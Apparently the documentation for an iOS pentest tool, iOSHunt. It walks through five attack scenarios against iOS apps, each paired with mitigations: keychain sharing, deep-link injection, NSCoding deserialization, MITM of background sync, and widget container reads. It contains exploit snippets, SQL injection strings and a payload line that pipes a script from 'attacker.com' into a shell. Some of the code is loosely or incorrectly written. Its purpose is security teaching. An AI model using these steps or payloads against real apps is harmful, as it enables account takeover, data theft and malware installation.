# Real-World Attack Scenarios Using New iOSHunt Features

Dokumentasi ini menunjukkan bagaimana setiap vulnerability yang baru terdeteksi oleh iOSHunt dapat diexploi dalam dunia nyata.

---

## 🎯 Attack Scenario 1: Cross-App Keychain Theft

### Vulnerability
App menyimpan sensitive tokens dengan insecure keychain sharing:
- `kSecAttrAccessGroup = "group.com.company"`
- Wildcard sharing atau Team ID sharing

### Attack Flow

**Phase 1: Reconnaissance**
```bash
# Tester (pentester) runs iOSHunt
ioshunt recon com.banking.app

# Report identifies:
# ✓ Keychain Shared via App Groups: group.com.company
# ✓ CRITICAL: Keychain shared with wildcard: *
```

**Phase 2: Analysis**
```json
{
  "finding": "Keychain Shared via App Groups",
  "description": "Other apps in group can access keychain items",
  "access_group": "group.com.company",
  "impact": "CRITICAL - ANY app with same group ID can steal keychain"
}
```

**Phase 3: Dynamic Verification**
```bash
# Monitor what's being stored
ioshunt attach com.banking.app --keychain-monitor

# Output shows:
# [KEYCHAIN_ADD] Storing item with custom access group:
#   Service: access_token
#   Access Group: group.com.company
#   [!!!] CRITICAL: Wildcard access group!
#
# [KEYCHAIN_ADD] Storing item with custom access group:
#   Service: refresh_token
#   Access Group: group.com.company
```

**Phase 4: Exploitation Steps**

1. **Create Attacker App**
   ```swift
   // Attacker creates iOS app with SAME Team ID
   // App requests entitlements:
   <key>keychain-access-groups</key>
   <array>
       <string>group.com.company</string>
   </array>
   ```

2. **Install Both Apps on Device**
   ```bash
   ios-deploy -b legit_app.ipa
   ios-deploy -b attacker_app.ipa
   ```

3. **Read Victim's Keychain**
   ```swift
   // In attacker app
   let query: [String: Any] = [
       kSecClass as String: kSecClassGenericPassword,
       kSecAttrService as String: "access_token",
       kSecAttrAccessGroup as String: "group.com.company",
       kSecReturnData as String: true
   ]

   var result: CFTypeRef?
   SecItemCopyMatching(query as CFDictionary, &result)
   // result contains: Victim's access token!
   ```

4. **Use Stolen Token**
   ```bash
   # Attacker now impersonates victim
   curl -H "Authorization: Bearer STOLEN_TOKEN" https://api.bank.com/balance
   # Returns victim's account balance
   ```

### Impact
- 💰 Account takeover
- 📊 Financial data theft
- 🔑 Session hijacking
- 🏦 Unauthorized transactions

### Mitigation
```swift
// DON'T: Share keychain with other apps
kSecAttrAccessGroup = "group.*"  // ✗ WRONG

// DO: Keep keychain app-specific
// Don't set kSecAttrAccessGroup at all
// or use only legitimate app extensions
```

---

## 🔗 Attack Scenario 2: Deep Link Injection & Priv Escalation

### Vulnerability
App registers custom URL scheme pero tanpa proper input validation:
- `myapp://action?param=value`
- No whitelist, no sanitization
- Handles authentication-critical actions

### Attack Flow

**Phase 1: Recon**
```bash
ioshunt recon com.socialnetwork.app

# Report shows:
# ✓ Unvalidated URL Scheme Handler: myapp://
# ✓ Sensitive URL Scheme: myapp://login (Auth-related)
# ✓ Missing Host Whitelist: myapp://
```

**Phase 2: Dynamic Analysis**
```bash
ioshunt attach com.socialnetwork.app --url-scheme-monitor

# Monitor shows:
# [URL_SCHEME] URL Scheme Called:
#   Scheme: myapp://
#   Full URL: myapp://profile?id=exact_user_id&edit=true
#   [!] SUSPICIOUS: No validation detected
```

**Phase 3: Exploitation**

**Attack A - Account Takeover via Auth Bypass**
```bash
# Victim receives SMS:
# "Urgent: Verify your account"
# myapp://login?user=victim@email.com&token=ANYTHING

# App processes without validation:
if (urlComponents.host == "login") {
    // NO VERIFICATION OF token!
    loginUser(username)  // ✗ VULNERABLE
}

# Victim taps → logged in as attacker
```

**Attack B - Privilege Escalation**
```bash
# Attacker crafts:
myapp://profile?id=ADMIN_USER_ID&editMode=true&isAdmin=true

# App doesn't validate:
if (editMode == "true") {
    // NO SOURCE VERIFICATION
    showEditInterface()  // ✗ VULNERABLE
    if (isAdmin == "true") {
        grantAdminAccess()  // ✗ ESCALATED!
    }
}

# Attacker gains admin powers
```

**Attack C - SQL Injection via Deep Link**
```bash
# App uses URL params in database query:
myapp://user?id=1' OR '1'='1' --

// In app:
let id = urlComponents["id"]  // "1' OR '1'='1' -- "
database.query("SELECT * FROM users WHERE id = '\(id)'")
// Returns ALL users instead of one

// Result: Database leak
```

**Attack D - Invoke Hidden Functions**
```bash
# App has hidden admin endpoint:
myapp://admin/reset_database?confirm=true

// Sends SMS with:
open("myapp://admin/reset_database?confirm=true")

// App processes → database reset!
```

### Real-World Exploitation Chain
```
1. Attacker identifies Instagram deep link vulnerability
2. Researches Instagram URL schemes
3. Finds: instagram://user?id=USERID
4. Sends malicious link: instagram://user?id=<ADMIN_ID>&edit=true
5. Victim taps → Attacker profile shows admin options
6. Attacker changes victim's password
7. Attacker gains account
```

### Impact
- 👤 Account takeover
- 📱 Session hijacking
- 💻 Privilege escalation
- 🗄️ Database access
- 🔓 Admin panel access

### Detection & Exploitation with iOSHunt
```bash
# Step 1: Find vulnerable schemes
ioshunt recon instagram

# Step 2: Monitor ALL URL scheme calls
ioshunt attach instagram --url-scheme-monitor

# Step 3: Test injection
xcrun simctl openurl booted "instagram://user?id=1' OR '1'='1"

# Step 4: Frida shows it's processed unsafely
# [URL_SCHEME] URL Scheme Called:
#   Full URL: instagram://user?id=1' OR '1'='1
#   [!] SUSPICIOUS: Possible SQL injection in URL
```

### Mitigation
```swift
// DO: Validate all URL scheme parameters
func application(_ app: UIApplication,
                 open url: URL,
                 options: [UIApplication.OpenURLOptionsKey : Any] = [:]) -> Bool {

    // 1. Whitelist allowed hosts
    guard let host = url.host,
          ["profile", "login", "reset"].contains(host) else {
        return false  // ✓ REJECT unknown hosts
    }

    // 2. Validate parameters
    guard let id = url.queryParameters["id"],
          let idInt = Int(id),
          idInt > 0 else {
        return false  // ✓ REJECT invalid IDs
    }

    // 3. Verify source
    guard options[.sourceApplication] as? String == "com.apple.mobilesafari" else {
        return false  // ✓ REJECT unexpected sources
    }

    // Only proceed if all validations pass
    return handleURL(url)
}
```

---

## 📦 Attack Scenario 3: Object Injection via Unsafe NSCoding

### Vulnerability
App deserializes objects tanpa NSSecureCoding:
- Uses `unarchiveObjectWithData`
- NO allowedClasses restrictions
- Can process ANY object type

### Attack Flow

**Phase 1: Discovery**
```bash
ioshunt recon com.ecommerce.app

# Report shows:
# ✓ Unsafe NSCoding (Possible Object Injection)
# ✓ Unsafe NSKeyedUnarchiver Usage
# ✓ Deprecated Deserialization API (Critical)
```

**Phase 2: Monitor Deserialization**
```bash
ioshunt attach com.ecommerce.app --nscoding-monitor

# Shows:
# [!] CRITICAL: Unsafe unarchiveObjectWithData called!
#   Method: NSKeyedUnarchiver.unarchiveObjectWithData
#   Vulnerability: Can deserialize ANY object type
#   Risk: Object Injection / Remote Code Execution

# [*] Archiving object: ShoppingCart
# [*] Archiving object: UserSession
# [*] Decoding class: Transaction
```

**Phase 3: Find Attack Vector**

Attacker identifies app saves shopping cart with NSCoding:
```swift
// App saves cart to file
let cart = ShoppingCart()
cart.items = [...]
cart.total = 99.99

let data = NSKeyedArchiver.archivedData(withRootObject: cart)
try data.write(to: fileURL)  // Saved to Documents

// App loads cart:
if let loadedCart = NSKeyedUnarchiver.unarchiveObject(withFile: path) {
    // ✗ VULNERABLE: Can deserialize any object
}
```

**Phase 4: Exploitation**

**Method 1: File Access Exploit**
```
App stores plist in Documents folder (accessible)
Attacker:
1. Mounts device with Xcode
2. Navigates to Documents/cart.plist
3. Modifies the plist to inject malicious object
4. App deserializes → RCE
```

**Method 2: iCloud Documents Sync Exploit**
```
App syncs data via iCloud:
1. Set up iCloud Documents sync
2. Attacker has iCloud account
3. Malicious file syncs to victim
4. App opens file → deserializes → RCE
```

**Method 3: Backup Exploit**
```
Device is backed up to iCloud/iTunes:
1. Attacker gains backup access
2. Modifies plist in backup
3. Victim restores from backup
4. Malicious object restored → RCE
```

**Phase 5: Payload Crafting**

```swift
// Attacker creates malicious plist
// Contains object that executes code during init:

@interface PayloadObject : NSObject <NSCoding>
- (void)encodeWithCoder:(NSCoder*)coder
- (id)initWithCoder:(NSCoder*)coder
@end

@implementation PayloadObject
- (id)initWithCoder:(NSCoder*)coder {
    // This runs DURING deserialization
    // Before app has ANY chance to validate!

    system("curl attacker.com/setup.sh | sh");  // Download & run malware
    // OR
    [NSTask execute:@"launchctl load /System/Malware"];  // Install persistence

    return [self init];
}
@end
```

**Phase 6: Delivery**
```
1. Victim syncs app data
2. Attacker sends malicious plist via email attachment
3. Victim opens plist → auto-loads in app
4. OR app auto-opens from backup
5. RCE 🎯
```

### Real Attack Example: Bank App Object Injection
```
1. Bank app stores transaction history with NSCoding
2. Attacker gains access to iCloud backup
3. Modifies plist to inject TransactionObject that runs code
4. Code: Transfers money using in-app API
5. OR Code: Steals encryption keys
6. Victim's device compromised
```

### Impact
- 💻 Remote Code Execution
- 🔑 Steal encryption keys
- 💰 Unauthorized transactions
- 🔓 Device jailbreak
- 📱 Persistent malware
- 🌐 Botnet infection

### Detection with iOSHunt
```bash
# Detect unsafe deserialization
ioshunt recon com.vulnerable.app

# Monitor deserialization calls
ioshunt attach com.vulnerable.app --nscoding-monitor

# Shows exactly when/where unsafe deserialization happens
# [*] Archiving object: UserData
# [!] CRITICAL: Unsafe unarchiveObjectWithData called!
```

### Mitigation
```swift
// DON'T: Use unsafe deserialization
if let object = NSKeyedUnarchiver.unarchiveObject(withFile: path) {
    // ✗ Can deserialize ANYTHING
}

// DO: Use NSSecureCoding with allowedClasses
do {
    if let object = try NSKeyedUnarchiver.unarchivedObject(
        ofClass: ShoppingCart.self,  // ✓ Only allow ShoppingCart
        from: data
    ) {
        // Safe - only ShoppingCart can be deserialized
    }
} catch {
    // ✓ Reject malicious data
}
```

---

## 📡 Attack Scenario 4: Background Data Exfiltration

### Vulnerability
App syncs sensitive data di background without proper security:
- No SSL pinning
- Background URLSession tanpa encryption
- Periodically syncs user data

### Attack Flow

**Phase 1: Detection**
```bash
ioshunt recon com.finance.app

# Report shows:
# ✓ Potential Background Data Leak
# ✓ Background URLSession detected
# ✓ Network (Plaintext HTTP) detected
```

**Phase 2: Monitoring**
```bash
ioshunt attach com.finance.app --headers

# Shows all API calls:
# [API_MONITOR] API Call:
#   Method: POST
#   URL: https://api.finance.com/sync
#   Headers:
#     Authorization: Bearer TOKEN
#   Body: {
#     account_number: "4532123456789012",
#     balance: 25000.50,
#     transactions: [...]
#   }
```

**Phase 3: Network Interception**

**Setup MITM Attack:**
```bash
# 1. Create WiFi hotspot
# 2. Route victim traffic through attacker's laptop
# 3. Use mitmproxy to intercept:

sudo mitmproxy -p 8080

# 4. Configure victim device:
#    WiFi Settings > Proxy > Manual
#    Server: attacker.local
#    Port: 8080
```

**Phase 4: Capture Sensitive Data**
```
Background sync happens:
mitmproxy intercepts POST to /sync

Request:
POST /sync HTTP/1.1
Host: api.finance.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
Content-Type: application/json

{
  "account_number": "4532123456789012",
  "balance": 25000.50,
  "transactions": [
    {"date": "2024-01-15", "amount": 500, "recipient": "John"},
    ...
  ]
}

✓ CAPTURED: Full financial data
```

### Real Attack Scenario
```
1. Victim uses finance app on public WiFi
2. Attacker sets up rogue WiFi: "AirportFreeWiFi"
3. Victim connects
4. Finance app does background sync
5. Attacker captures:
   - Account numbers
   - Balances
   - Transaction history
   - Session tokens
6. Attacker uses stolen token to:
   - Transfer money
   - Change password
   - Access in-app features
```

### Impact
- 💰 Financial data theft
- 🔑 Session token capture
- 📊 Account information exposure
- 💳 Credit card details (if synced)
- 🏦 Unauthorized transactions

### Prevention Detection with iOSHunt
```bash
# Find background sync vulnerabilities
ioshunt recon com.finance.app

# Confirm SSL pinning (or lack thereof)
# If no certificate pinning found:
# ✓ Missing Certificate Pinning - vulnerable to MITM

# Monitor actual background operations
ioshunt attach com.finance.app --monitor-api

# Shows what's being sent in background
```

### Mitigation
```swift
// DO: Implement SSL Certificate Pinning
import Alamofire

let evaluator = ServerTrustEvaluator()

let manager = Session(
    serverTrustManager: ServerTrustManager(evaluators: [
        "api.finance.com": PinnedCertificatesTrustEvaluator(
            certificates: [pinnedCertificate],  // ✓ Pin certificate
            acceptSelfSignedCertificates: false,
            performDefaultValidation: true,
            validateHost: true
        )
    ])
)

// DO: Use HTTPS only
// DON'T: Accept plain HTTP
```

---

## 📦 Attack Scenario 5: Widget Data Interception

### Vulnerability
App uses shared container (app groups) for WidgetKit:
- `com.apple.security.application-groups`
- Widget data in shared folder
- Other apps can read shared container

### Attack Flow

**Phase 1: Discovery**
```bash
ioshunt recon com.weather.app

# Report shows:
# ✓ App Extension Shared Container: group.com.weather
# ✓ WidgetKit enabled - widget data may be accessible
```

**Phase 2: Analysis**
```json
{
  "entitlement": "com.apple.security.application-groups",
  "group_id": "group.com.weather",
  "risk": "HIGH",
  "description": "Widget data shared - accessible to other apps"
}
```

**Phase 3: Attacker Prepares**

Create attacker app with SAME app group:
```swift
// Attacker app's entitlements
<key>com.apple.security.application-groups</key>
<array>
    <string>group.com.weather</string>
</array>
```

**Phase 4: Read Shared Data**
```swift
// In attacker app
let sharedContainer = FileManager.default
    .containerURL(forSecurityApplicationGroupIdentifier: "group.com.weather")!

// List weather app's shared files
do {
    let files = try FileManager.default
        .contentsOfDirectory(at: sharedContainer, includingPropertiesForKeys: nil)

    for file in files {
        // Attacker reads:
        let data = try Data(contentsOf: file)
        let decoder = JSONDecoder()
        let weatherData = try decoder.decode(WeatherData.self, from: data)

        print("Location: \(weatherData.location)")
        print("Latitude: \(weatherData.latitude)")
        print("Longitude: \(weatherData.longitude)")
    }
} catch {
    print("Error: \(error)")
}
```

### Real Attack Scenario: Location Privacy Leak
```
1. Victim uses weather app that shows current location
2. Widget also shows location (for shared container)
3. Attacker installs app with same group
4. Attacker reads shared container
5. Gets real-time location data
6. Tracks victim's movements
7. Stalking / Physical attacks / Robbery planning
```

### Impact
- 📍 Real-time location tracking
- 🔍 Privacy invasion
- 🚨 Stalking capability
- 💰 Robbery/physical attacks (know when home)
- 👨‍👩‍👧‍👦 Family safety compromised

### Detection with iOSHunt
```bash
# Identify app group sharing
ioshunt recon com.weather.app

# Shows:
# ✓ App Extension Shared Container: group.com.weather
# → Widget data accessible to other apps!

# Verify in Frida
ioshunt attach com.weather.app --keychain-monitor
# [APP_GROUP] Accessing shared container:
#   Group ID: group.com.weather
#   [!] Data shared with app extensions/other apps!
```

### Mitigation
```swift
// DON'T: Store sensitive data in app group
let sharedContainer = FileManager.default
    .containerURL(forSecurityApplicationGroupIdentifier: "group.com.weather")!

// WRONG ✗
let userData = ["location": currentLocation, "home_address": homeAddress]
try JSONEncoder().encode(userData).write(to: sharedContainer)

// DO: Only share minimally necessary data
// Encrypt sensitive data
let encrypted = AES.encrypt(sensitiveData, key: sharedKey)
try encrypted.write(to: sharedContainer)

// DO: Restrict app group to only necessary apps
// Don't use generic "group.com.company" that matches many apps
```

---

## 📋 Exploitation Summary Table

| Scenario | Vulnerability | Tool | Exploit | Impact |
|----------|---|---|---|---|
| 1 | Keychain Sharing | keychain-monitor | Create app with same group | Account takeover |
| 2 | URL Scheme | url-scheme-monitor | Inject malicious params | Priv escalation |
| 3 | NSCoding | nscoding-monitor | Modify plist, inject object | RCE |
| 4 | Background Sync | monitor-api + MITM | Intercept traffic | Data theft |
| 5 | Widget Data | recon | Read app group container | Location leak |

---

## 🛡️ General Exploitation Tips

1. **Always Verify with iOSHunt First**
   ```bash
   ioshunt recon target.app
   # Check for new vulnerability types
   ```

2. **Use Frida Hooks for Confirmation**
   ```bash
   ioshunt attach target.app --url-scheme-monitor --keychain-monitor
   # Confirm vulnerability is exploitable
   ```

3. **Combine with MITM For Network Attacks**
   ```bash
   # Background sync? Set up mitmproxy
   # Deep links? Test URL injection
   ```

4. **Test in Isolated Environment**
   ```bash
   # Use simulator or dedicated test device
   # NOT victim's device
   ```

5. **Document Everything**
   ```bash
   # iOSHunt reports all findings
   # Use for client documentation
   ```

---

**Remember**: These are for authorized penetration testing and security research ONLY!
